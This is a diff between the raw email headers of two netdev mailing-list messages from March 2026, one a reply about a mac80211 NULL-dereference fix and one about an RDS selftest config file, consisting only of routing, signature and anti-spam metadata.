@@ -1,500 +1,312 @@
-Return-Path: <netdev+bounces-268880-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-268881-lists+netdev=lfdr.de@vger.kernel.org>
 Delivered-To: lists+netdev@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id UJlBIPcsumkqSgIAu9opvQ
-	(envelope-from <netdev+bounces-268880-lists+netdev=lfdr.de@vger.kernel.org>)
-	for <lists+netdev@lfdr.de>; Wed, 18 Mar 2026 05:41:27 +0100
+	id aE98Jr8tumlDSgIAu9opvQ
+	(envelope-from <netdev+bounces-268881-lists+netdev=lfdr.de@vger.kernel.org>)
+	for <lists+netdev@lfdr.de>; Wed, 18 Mar 2026 05:44:47 +0100
 X-Original-To: lists+netdev@lfdr.de
 Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
-	by mail.lfdr.de (Postfix) with ESMTPS id 26C0B2B5CA1
-	for <lists+netdev@lfdr.de>; Wed, 18 Mar 2026 05:41:27 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 480012B5CC8
+	for <lists+netdev@lfdr.de>; Wed, 18 Mar 2026 05:44:47 +0100 (CET)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id 4F5B7303DD58
-	for <lists+netdev@lfdr.de>; Wed, 18 Mar 2026 04:41:23 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id BE84D302712D
+	for <lists+netdev@lfdr.de>; Wed, 18 Mar 2026 04:44:44 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id CD0353559FB;
-	Wed, 18 Mar 2026 04:41:22 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id E6455355F24;
+	Wed, 18 Mar 2026 04:44:43 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="OPgdcBzI"
+	dkim=pass (2048-bit key) header.d=oracle.com header.i=@oracle.com header.b="GmAZgpi9";
+	dkim=pass (1024-bit key) header.d=oracle.onmicrosoft.com header.i=@oracle.onmicrosoft.com header.b="ML1iSiDF"
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-dl1-f51.google.com (mail-dl1-f51.google.com [74.125.82.51])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from mx0b-00069f02.pphosted.com (mx0b-00069f02.pphosted.com [205.220.177.32])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 895253537DA
-	for <netdev@vger.kernel.org>; Wed, 18 Mar 2026 04:41:20 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.51
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1773808882; cv=none; b=X6e27ciIOKki6bQpYm6KSxxdX2kXU47zsSmfpUtiAbMvHRi2HJ2SBFnSgNh7NtuELPw+hw/8IFCmN2UJk0PDlHb4FEjVrgT89Ockir/TD5ZxwD6RHtnKt6HPOR1+NaDznK8BkhJql5fYPJoR1ubcAwgD+ibDvQd2K3O1Uu5wo4g=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1773808882; c=relaxed/simple;
-	bh=/J+ASTkl9WElFOBVSaa8QCo751ufHjYWroOGCUkO/XY=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=I1qCSBrVKkQbpXJkGdKqF0KZ92Bkaxwoqjgy/9Diy5KB/RnoAJ47cEAXXEzTJk8mflaPdycClPqBEbnlvIq243R+B2ZNVHKXwt7yPOQ1SBV+Va9JQwVUfVg+IIgUaVaXcs6LYarik+CdZu9hSorYGbxAmbWklOiCK9q4itYv+Jg=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=OPgdcBzI; arc=none smtp.client-ip=74.125.82.51
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
-Received: by mail-dl1-f51.google.com with SMTP id a92af1059eb24-126ea4e9694so1009094c88.1
-        for <netdev@vger.kernel.org>; Tue, 17 Mar 2026 21:41:20 -0700 (PDT)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 62BFD1386DA;
+	Wed, 18 Mar 2026 04:44:42 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=205.220.177.32
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1773809083; cv=fail; b=iMIfovLULMs8YQxh2boiBu2Puf3L9ndJh9+HZFgdbGcL7qwomH+534ZTXTai39x/rbTuasfwH7mgapwVSRS6+iQ/ruW8Zllyal1djKlQ5eNyyUlzSMT5CzxEcR4j6iE1+PPAVw8boNseAzbnnnrijAJvEYxCdNjvqjLVYEVNE8w=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1773809083; c=relaxed/simple;
+	bh=uK7cXDh+JC31Gn3BnBG9uPBtrHmKdlb024OgxC7HUAg=;
+	h=From:To:CC:Subject:Date:Message-ID:References:In-Reply-To:
+	 Content-Type:MIME-Version; b=egyb0hBwBw5To01MmbIQBWOCGIIsDn48xdTAEt5dp1swmx7CnCB1pcVSuNbQrttmP4/S5QWapHcpDyTnlVQNeDgMiguOH5p7Xz9N9f3McbSFY4hziZ5QQ6TQdMfMqmAoYyPn9y0U+NUOACjFcm4/zplBPfOZa0qDvORW9it1NQM=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oracle.com; spf=pass smtp.mailfrom=oracle.com; dkim=pass (2048-bit key) header.d=oracle.com header.i=@oracle.com header.b=GmAZgpi9; dkim=pass (1024-bit key) header.d=oracle.onmicrosoft.com header.i=@oracle.onmicrosoft.com header.b=ML1iSiDF; arc=fail smtp.client-ip=205.220.177.32
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oracle.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=oracle.com
+Received: from pps.filterd (m0246630.ppops.net [127.0.0.1])
+	by mx0b-00069f02.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 62I2N2Vx2167326;
+	Wed, 18 Mar 2026 04:44:37 GMT
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=cc
+	:content-id:content-transfer-encoding:content-type:date:from
+	:in-reply-to:message-id:mime-version:references:subject:to; s=
+	corp-2025-04-25; bh=uK7cXDh+JC31Gn3BnBG9uPBtrHmKdlb024OgxC7HUAg=; b=
+	GmAZgpi91+7wFQuBQZgFhRfhOAp2pafg5WmvKXLwIOKgYnWDnH0eUJht8sSlduyk
+	TxAZC/Lwjkj/lbD7aYbO63lyZ/T8cc0ZRD59SvTNfoz/5q6eRiTKe9lyTMk5Koao
+	/tjjT1SpxZfsEYjvIddcmXfrbGcjT6DBMErnVAs04UoOjYY+0+qlbXE0zrjHyZvR
+	7ChlG/97W5M8kw2SOv5s1mK8CjnqaTeIFdwyK5baAK0ePSNgeayQgvD4LT6ov8qR
+	k7vhuSdK/miEIN/z+hVk7yFi+eBED81QbXI4QOsVOlfNosIqtQRQaLuKfDJLwbEy
+	hVkSwDQ7Laa2dbQBNPIuRQ==
+Received: from iadpaimrmta02.imrmtpd1.prodappiadaev1.oraclevcn.com (iadpaimrmta02.appoci.oracle.com [147.154.18.20])
+	by mx0b-00069f02.pphosted.com (PPS) with ESMTPS id 4cvx3b5b14-1
+	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
+	Wed, 18 Mar 2026 04:44:36 +0000 (GMT)
+Received: from pps.filterd (iadpaimrmta02.imrmtpd1.prodappiadaev1.oraclevcn.com [127.0.0.1])
+	by iadpaimrmta02.imrmtpd1.prodappiadaev1.oraclevcn.com (8.18.1.2/8.18.1.2) with ESMTP id 62I1aeZq021287;
+	Wed, 18 Mar 2026 04:44:36 GMT
+Received: from sj2pr03cu001.outbound.protection.outlook.com (mail-westusazon11012033.outbound.protection.outlook.com [52.101.43.33])
+	by iadpaimrmta02.imrmtpd1.prodappiadaev1.oraclevcn.com (PPS) with ESMTPS id 4cvx4pd043-2
+	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
+	Wed, 18 Mar 2026 04:44:36 +0000
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=NA2TVgIUgqp2AnUILbNxpBLAmEKtHB03v5s785JKZ+KbKvwKenkzkaTs/BsmkKrojWehXcJll4g0QSYar53Y6unjija1Yy+JdADwVVW8ps8Um+tUBJ+uBO0a23UFrcsZUwnQ22inxAN75ziT4Fwb6q/0DczYdpPBbxoxCinUBTltwsY+RZjYZGMG1/RCZSfWM/E7F4nK8mHf/h1QE5eolda3FYNPlwtOen11iJg3NEJcLHU/1ZQU7mtrEGymooX3UD3+whS2e09CxPVm8/5GFtAgP5F0G8NYH7IRvBzgRntmA9SWNfd3q9CmpfgMQTjC3i8h5GRVnE9srRNmD63ebA==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=uK7cXDh+JC31Gn3BnBG9uPBtrHmKdlb024OgxC7HUAg=;
+ b=qlsgY61QO0/fLUJCxACoDvrb2/JuT+Cxpk6bni0D6G/xys+x3/VOnbSj/YC9TeDOEumuc7R/I9wace29976fc7aXmJGZP4/Gqc/gRLKR/49LlOpX1GpkAzgOG8MHZ4f3FTT29I6yMkr0Z3PVnS/0qWmzOnw0uT/Sy+TsIbWSl0DdVz5nbNK7ShONKXFDhxjvnS4ASU9PsuLJ0e3Jaf+NEbAwRdgAjZNSv/50a0dfVIDVWGoW2hhRhvyXnJ8NCBwDPiWLm/BKJk1G0SNPeuT7Pjr7CLLFKvob7J6r3AoS7qyrRylxQxvOF1Rd+biaApgaFVLDA2wf/6dN4QsGScPegw==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
+ dkim=pass header.d=oracle.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=asu.edu; s=google; t=1773808880; x=1774413680; darn=vger.kernel.org;
-        h=in-reply-to:content-transfer-encoding:content-disposition
-         :mime-version:references:message-id:subject:cc:to:from:date:from:to
-         :cc:subject:date:message-id:reply-to;
-        bh=tRYg9JSUgvXK9NM5gGmEYeA3N/ZjezbLhEkELXos234=;
-        b=OPgdcBzILj1HsFGIjlzMFXf5vg6iyX4ZEBstjFnd5M1cZ+PlPZ8lrMKkgLq+2/9W6a
-         c4lSWDVGrE9ekdD9re4/7fInemUSGCUweYf8J5JUCi8DR+Bc02XM3mEG77sBtvLjmHBD
-         i0pR8BEirMZ3Dgfs4VMeKBV1EwPVxFAe7xK+g0z7Lz2SBg6Jv2/zpoyeBG0XoyBfMHdA
-         znNDg4lStbtM5p1iH7LhrxI727R3B4XHluwQGP5UOW2AVgoxkm2UtBR7NTRDi3iKb9WL
-         v92Hd333nNeFcVgSEkrXg37rCY6GVkvdIazQeDKtoh73w8eI349Wa4yU1OLsxeeIIOu3
-         BYqw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1773808880; x=1774413680;
-        h=in-reply-to:content-transfer-encoding:content-disposition
-         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=tRYg9JSUgvXK9NM5gGmEYeA3N/ZjezbLhEkELXos234=;
-        b=Dfb+Gp/aKjJNj/NjG3M1tamytcQlL+RV+Jv2w4qgQNaK1+pQCcfcsXh5cTGVVSla7p
-         4+sZYlbpnrWu9HApAxzargwpfCmPfdENbnBNFhEbrDbMo7off+f4MHhOTn831a4O7Jrx
-         VHAYUpLBK2TCza7Cvs6vX+yG9p3oomxPfiZtxPZs4x5uzsx2Y/4qpjqn1O9xbDIk2Ezg
-         9ze5z7JdpJTit4u/6qmlXQqCmmJN3+ERjTA2ZXt/zvhEjXo9FQeiMCHf1nQppZLg+JkM
-         01BWSfllTSE13hprTbLW3XAoSEqQB7Tx6eVEl/oNmELG8XnFiKs4ilECHVhPuSHB4Pf3
-         1RQg==
-X-Gm-Message-State: AOJu0YwbO8bKBuI5GkfN7RloI5MV9bb0TRE9gqCUCByqg2lU0h3c1Y06
-	BLRwNNRoT0/0OqNvhrAktZFSMm+wEz2EliBvTntCNpQs5FoDUW5WjADtzTVJj9B5lQ==
-X-Gm-Gg: ATEYQzzL/XOj94tUKQbDurbqUmH4PR3vCNwrxvsrP4M22J8pBxJEPsyqFLFg1Wp7gUQ
-	39SmGANHDIc2/bGd+vPsGMVHASzCG3mED18lQls/OI50g2RNmDNJI2amnMfUCpoicimJZ+CsFMp
-	NMowFyvkTvXxEae55sxO/dgr5Rc+vhnQ8p0GRqRJjrhuRpxT+zTws5NUJjIBwBtIf1lyl/9gBDf
-	b02fh2qVRVXjaOfkYasjYYF9CGj7tn5CqIo3u9thH3U1QXFr9qz4VLqmhoTdsz6VX3mq0harkyg
-	onjXQ6mqVCYKA2psKQBsv/hGyVKN8Ao4VZgnK0u234vbtlRmo8ZmgfRSHbVVnwlvOIlec0F/tSB
-	rpGwk37w/jWHjDVsEs+HiQe2aPN5EQsQ6F5mxJf1kK/nsl104dlzw63ERNDHZOMffoN9ZWoYVuk
-	cDHSjJqK7vk2f00PjLYL1X83/FaMBXmw==
-X-Received: by 2002:a05:7022:b8e:b0:128:d0b1:527 with SMTP id a92af1059eb24-129a7199f1bmr1170592c88.36.1773808879455;
-        Tue, 17 Mar 2026 21:41:19 -0700 (PDT)
-Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
-        by smtp.gmail.com with ESMTPSA id a92af1059eb24-129b4127b7esm3213646c88.9.2026.03.17.21.41.18
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Tue, 17 Mar 2026 21:41:19 -0700 (PDT)
-Date: Tue, 17 Mar 2026 21:41:17 -0700
-From: Xiang Mei <xmei5@asu.edu>
-To: security@kernel.org
-Cc: netdev@vger.kernel.org, johannes@sipsolutions.net, 
-	linux-wireless@vger.kernel.org, bestswngs@gmail.com
-Subject: Re: [PATCH net] wifi: mac80211: fix NULL deref in
- mesh_matches_local()
-Message-ID: <k6lgszcsjftoc46jrpt6vtwmzxuzzfawrnujwilmxibqcmqb7a@4r4darslq6zo>
-References: <20260318034244.2595020-1-xmei5@asu.edu>
+ d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=uK7cXDh+JC31Gn3BnBG9uPBtrHmKdlb024OgxC7HUAg=;
+ b=ML1iSiDFmIA9s6dUdDc41ZCGJDq0jQlfQpGI1qtjVhKy54S8Hb2WRLHUGuW5MhvdX4PEYf34uIB1+jo3AZtkhMM0VoPOQoU1Zaa5W5GqSK1YQQ4JEWvmi7Gk1wQw60ia/3TtaiXPGFqiLtQ5UKyhxvgZIxRFWtR70xtMPgkS4iQ=
+Received: from DM4PR10MB7404.namprd10.prod.outlook.com (2603:10b6:8:180::7) by
+ DS0PR10MB7224.namprd10.prod.outlook.com (2603:10b6:8:f5::14) with Microsoft
+ SMTP Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.20.9723.19; Wed, 18 Mar 2026 04:44:32 +0000
+Received: from DM4PR10MB7404.namprd10.prod.outlook.com
+ ([fe80::42e:713d:d4c8:793f]) by DM4PR10MB7404.namprd10.prod.outlook.com
+ ([fe80::42e:713d:d4c8:793f%4]) with mapi id 15.20.9723.018; Wed, 18 Mar 2026
+ 04:44:31 +0000
+From: Allison Henderson <allison.henderson@oracle.com>
+To: "kuba@kernel.org" <kuba@kernel.org>
+CC: "linux-rdma@vger.kernel.org" <linux-rdma@vger.kernel.org>,
+        "linux-kselftest@vger.kernel.org" <linux-kselftest@vger.kernel.org>,
+        "rds-devel@oss.oracle.com" <rds-devel@oss.oracle.com>,
+        "shuah@kernel.org"
+	<shuah@kernel.org>,
+        "pabeni@redhat.com" <pabeni@redhat.com>,
+        "horms@kernel.org" <horms@kernel.org>,
+        "edumazet@google.com"
+	<edumazet@google.com>,
+        "netdev@vger.kernel.org" <netdev@vger.kernel.org>,
+        "achender@kernel.org" <achender@kernel.org>
+Subject: Re: [PATCH net-next v1] selftest: rds: add
+ tools/testing/selftests/net/rds/config
+Thread-Topic: [PATCH net-next v1] selftest: rds: add
+ tools/testing/selftests/net/rds/config
+Thread-Index: AQHctaDatbWm6B16hkWSTSCqoeIRzbWyzOmAgAA+0YCAADosgIAAcqYA
+Date: Wed, 18 Mar 2026 04:44:31 +0000
+Message-ID: <8b81bc9dbe0b13addae73e7d75dd5d00214b2882.camel@oracle.com>
+References: <20260316235848.2395654-1-achender@kernel.org>
+	 <728fc0aa-4c07-4092-91bb-6b9f76c2f3eb@redhat.com>
+	 <d33e764e33b5a4c6464a692371afc41d4a01c15d.camel@oracle.com>
+	 <20260317145407.244ee071@kernel.org>
+In-Reply-To: <20260317145407.244ee071@kernel.org>
+Accept-Language: en-US
+Content-Language: en-US
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+user-agent: Evolution 3.52.3-0ubuntu1.1 
+autocrypt: addr=allison.henderson@oracle.com; prefer-encrypt=mutual;
+ keydata=mQGNBGMrSUYBDADDX1fFY5pimVrKxscCUjLNV6CzjMQ/LS7sN2gzkSBgYKblSsCpzcbO/
+ qa0m77Dkf7CRSYJcJHm+euPWh7a9M/XLHe8JDksGkfOfvGAc5kkQJP+JHUlblt4hYSnNmiBgBOO3l
+ O6vwjWfv99bw8t9BkK1H7WwedHr0zI0B1kFoKZCqZ/xs+ZLPFTss9xSCUGPJ6Io6Yrv1b7xxwZAw0
+ bw9AA1JMt6NS2mudWRAE4ycGHEsQ3orKie+CGUWNv5b9cJVYAsuo5rlgoOU1eHYzU+h1k7GsX3Xv8
+ HgLNKfDj7FCIwymKeir6vBQ9/Mkm2PNmaLX/JKe5vwqoMRCh+rbbIqAs8QHzQPsuAvBVvVUaUn2XD
+ /d42XjNEDRFPCqgVE9VTh2p1Ge9ovQFc/zpytAoif9Y3QGtErhdjzwGhmZqbAXu1EHc9hzrHhUF8D
+ I5Y4v3i5pKjV0hvpUe0OzIvHcLzLOROjCHMA89z95q1hcxJ7LnBd8wbhwN39r114P4PQiixAUAEQE
+ AAbQwQWxsaXNvbiBIZW5kZXJzb24gPGFsbGlzb24uaGVuZGVyc29uQG9yYWNsZS5jb20+iQHUBBMB
+ CgA+AhsDBQsJCAcCBhUKCQgLAgQWAgMBAh4BAheAFiEElfnzzkkP0cwschd6yD6kYDBH6bMFAmiSe
+ HYFCQkpljAACgkQyD6kYDBH6bOHnAv8C3/OEAAJtZcvJ7OVhwzq0Qq60hWPXFBf5dCEtPxiXTJQHk
+ SDl0ShPJ6LW1WzRSnaPl/qVSAqM1/xDxRe6xk0gpSsSPc27pcMryJ5NHPZF8lfDY80bYcGvi1rIdy
+ KD0/HUmh6+ccB6FVBtWTYuA5PAlVOvwvo3uJ6aQiGPwcGO48jZnIBth96uqLIyOF+UFBvpDj6qbfF
+ WlJ8ejX8lmC7XiY8ZKYZOFfI7BRTQxrmsJS2M+3kRTmGgsb6bbPhaIVNn68Su6/JSE85BvuJshZT0
+ BmNdWOwui6NbXrHgyee0brVKbngCfE4+RZIzleoydbHP2GnBtaF2okhnUWS/pNKsOYBa3k8IXdygc
+ CbiXmjs3fIf+8HIm0Vzmgjbi5auS4d+tB+8M22/HWdxmdAB0sHUFMtC8weYpVxvnpGAsPvy166nR5
+ YpVdigugCZkaObALjkJzNXGcC4fuHcqZ2LVHh9FsjyQaemcj8Y6jlm4xUXgyiz7hkTNsWJZDUz5kV
+ axLm
+x-ms-publictraffictype: Email
+x-ms-traffictypediagnostic: DM4PR10MB7404:EE_|DS0PR10MB7224:EE_
+x-ms-office365-filtering-correlation-id: 4edaf013-7556-41f7-7d5a-08de84a90c02
+x-ms-exchange-senderadcheck: 1
+x-ms-exchange-antispam-relay: 0
+x-microsoft-antispam:
+ BCL:0;ARA:13230040|376014|1800799024|366016|38070700021|22082099003|18002099003|56012099003;
+x-microsoft-antispam-message-info:
+ 6OqIzQbjc9yf27f3GxkNiBmBbGG0uFiu0ux/1uy772WW304e9CNG65sBpl+stEvHi9tD0zmbIDYil77fVRFPoLd3J67o9kMKX5rD0+Klvdfzt0OSV5K4wz1OlvJ2zxG2hyd2Fs/wuVy1Z03tCirCq+mJmbZDJv3SvAUcm7t+WAPqi2Pzc9TQzDDrg+KauHzzoGKrQkwe6MJN6m8gMM5HHEMPzQPqQKZdMg2S+xt2iAyrG35foiZJKdpN5eHrcpEIABxHnbTCWHskN2nMLmn9BQuUze+HUmsQgd5u3CGiGP6MHXFXmYO0uWjlfKI+T9ZdvffW8GJwE5Xh4BNxcBgAsea0Q9FiCF9ynwFWCzKH5umO6aVQfoGYnQakPvpDcJvzLeNEabTQ5B/d809WvZ6CGnkspdOztMpQpCpuGmHqw8fvfNDngv5TqbuMlDQ0jlb79MJGfdQ7IvQaym5xj1xgPkZdhaTCFf5u/fLja3BxTuYeb2v5u8Dh6Zed6PWDcWvkMuqcMz+fY3lmPWHfIrlzz9wklLXI3VXtrVZd8+z8dic9SoSPPx1909rGCdpm/DhtYutvDy3SLCOL6za5ZvWNn4KJ8sS8dgRW6lCennwkyos6PBE17apyZJy9hjg+JTAcTYMQGFgQqAqsN/HJhpoQtX3XFp6k0EqE+L52j0Fm7jGJXPEMeOQOpYLywef2Uw3Z/isS+cB6aERmleqDK8LoleWSBBWmsZJavaaCgfw/qxeT5PKEfB+NSbnlvzqSThoYmCoEEknqzTUlEWkyZavP0KXsSVSS5PNan53ldoevUFU=
+x-forefront-antispam-report:
+ CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DM4PR10MB7404.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(376014)(1800799024)(366016)(38070700021)(22082099003)(18002099003)(56012099003);DIR:OUT;SFP:1101;
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0:
+ =?utf-8?B?WG5jL21RNFMyK3ZYQVlPUWpmOXRIY29FVmEyTVo2ekNhR1VHVjRxd0xRWVF1?=
+ =?utf-8?B?Yk1lMUVzck1YUVZWekJFQlNidnJGSnhKR1pidkVCOVhqMGVrNHFVUzF5K1lC?=
+ =?utf-8?B?TXpXaHlncVFKV1BWYmVnajZidDdVNnFZSVBhZmh0OTZrVDQwa0todXhzdEtK?=
+ =?utf-8?B?VFBmQ2xsb2NZVUg4WCtKUDQvcmpsaWxHUVZaZmhPbWVtVHJ6Sk1xQ2tlUFlI?=
+ =?utf-8?B?VXg3UjNrUHhRSitsZ3c0cGI3Z3gyMXNhc0N0dzQwNk0rdXluT1VGM3Z4VEZn?=
+ =?utf-8?B?Sklyend0N2lOREx4ME5aRkRuR0wyay95RE9RcnRCdjNJRTVFc1h3WnNLUHh0?=
+ =?utf-8?B?Q0VvREhPQjFFTDBSZTRuM2VlaHNlZW9uc2IyMkQ1TDVsb2tDMTNBSzh6Y3dZ?=
+ =?utf-8?B?UC9wMFJWYzhualF6by92SE9UdUtaSGZBTEg0SFpIZG1FZ3k2TU5vQUZqbFRz?=
+ =?utf-8?B?aGtscXFESzJkNnFpdnA0SDRpU0lyb29rMjA1ek9tQ2p0UUZseHVGbFN6d1BE?=
+ =?utf-8?B?WWh2VXdteDl3MW9BbVdRQTI4OWorT0R1THJLY0RrazVCL1FpNnBXZTE1T05P?=
+ =?utf-8?B?WXRzVFVkVCtENnV5NVZZUCtCNTNCMS9kWUFIN0NaL2ViOVNCWHd6M3NlK0Rt?=
+ =?utf-8?B?QUYrSXh3cDBXL1YveElrcWJzUGhtcURSNVVNdGpHZXMxdVNjVjh5NWYxbGpT?=
+ =?utf-8?B?aElVTjZqbnc2eHQ5UVRRNDZxRThnMjdyaGpBcHQ3ZVljbFY3MGEvUHBWWEk5?=
+ =?utf-8?B?ZHowc1lTbjB0VmUwWkpia1VETkUrdWlUZEQvMXpRUFdkVktsTUJubGdwZU40?=
+ =?utf-8?B?eVZSOGlzNlQ3bGZaNE94S3ZPWUhJMVZOcTNHcUJtczdNNmhwQ2pGdUQybUxJ?=
+ =?utf-8?B?R3hDMkF6UTYwN1YrQmpSZndZM3AxYVBrMEFJTHp4aHJFT3FNbUhiVG9FbVFL?=
+ =?utf-8?B?a3dDcGE5c0RTbjFtZEZDTmFxUkpVU00vMDhTNU13VHpsaVNISGhVSVBRaXgz?=
+ =?utf-8?B?b0ZQRFdCazIwZnM2eFpFOGM2RzRnbGpvMWxHYmJtUDVLWHBKT2w1Rk5VSjZM?=
+ =?utf-8?B?bkpGdHR6OUVnYXNVajdUZXVUVW5yU1hTSE9HNUFja3hMOGhkekdKbGF5aTBT?=
+ =?utf-8?B?b3JJUnZyZGVpU2JLeDVPanJDUWV5YU8rRUJpSWZKQU8zbk9XWlpqbGFuRk93?=
+ =?utf-8?B?bDFObGpieVY0K1dwMmV1V3JHMFJ6N1pnN1hlSHNkbVFqSTkvRElUbXZUeFFC?=
+ =?utf-8?B?WlB4K0YzSmQrMDRiTVNGV2Zkbis0MmdENkdUTUZXWmU0NGxUVE5BdVVFTkgv?=
+ =?utf-8?B?dG1FYmpTZFRnWSthRmYvNHltaEI0cnQ1QktzOExJS2I3dmtYMlRjNDdUekNj?=
+ =?utf-8?B?MnlUbUlDT2lDQ0Fpa1BUaWdoRmI4YUxEVHlQMkYrZ2ZGRElJdndKd3FTN1c3?=
+ =?utf-8?B?eHY2eStzZGVrL3lyUXd2ZndVMllKSFZZKzd4Mmx1UWgrMVBvVFFYSWhnRzZQ?=
+ =?utf-8?B?T25LQ09rbzJWdk9xTFc5blRhSzROTThINU1KbjNtbGRma0JaeHZDc3diQVJn?=
+ =?utf-8?B?SFdEWGN5b2NVbnB4R3k1c01INTE3TDZQME4wNjN5emQrZVBrU0UyNVpFYVFk?=
+ =?utf-8?B?SkIxbnkzT3ZaL0ZTa2pmaE4rczQwWDF0ZlVKTG9lWDV6MzA5Q2YrM0p4TmZx?=
+ =?utf-8?B?cENlTk1RM3BXb3VFRnNVbWNyVCtMd05LRXhoM3krUHJ2cjJwdFcvYTB6dTN2?=
+ =?utf-8?B?VkFUSklUR2RkQTNNUUFuNEp4WllzY3l4U0d3dGdZaGJJZTBVRkdjU3QremNC?=
+ =?utf-8?B?aHBJTmk4a3l5M1dKcXFEOG1SN3VxWTBhSytmWUdGWkx6amNCc29iYWJITkdo?=
+ =?utf-8?B?V1o0RXI5Z2lkSEtmSEtjZldlRVQ3R3RURnREK0VoTjN4T0tRY2VPSzNZZjdx?=
+ =?utf-8?B?emhXNnRNVjBTbGluUjhZdDhLVE1MdUdtSkt5STdncDRiTkZRVkdmSGV6K01Q?=
+ =?utf-8?B?SEJOWGVkTHZQR1NUeE5FZ2FxVjVma2xDdFVDKzAwVElVdkdtU3RuME9KUnM1?=
+ =?utf-8?B?TU5INHZJNXpHTHhYZjdkQ0kyTCtudE9JM0kzb0VpTGM5RE9yYmxFaDhTSGo0?=
+ =?utf-8?B?Mk9KTUJLVDVxK2swbDBkRVZLMUFFWk9SbmhNL2xGRTBSY2FxeVNLNXVxMzh4?=
+ =?utf-8?B?ZlYxVHBMWmovRFZUR05GTHBHTmgxUUNLYUV1NTdTb3V0VE1xZ1lYVHlCZWxJ?=
+ =?utf-8?B?dTV6K2hxbFVTbHFVTnB4QTBKL2pxdjhhOVFtMGJ6ZXlmWEsvVm9Zd0pZZ212?=
+ =?utf-8?B?TWlBUE50QzhYY1FsZnZ1anpjSU51b25VVzAvZGE4djBlM0V3bFUrM1M3QnJO?=
+ =?utf-8?Q?h/kpWS2Phq4/hmTY=3D?=
+Content-Type: text/plain; charset="utf-8"
+Content-ID: <8B94C0DECAE9F243ABC1B465590F10CC@namprd10.prod.outlook.com>
+Content-Transfer-Encoding: base64
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
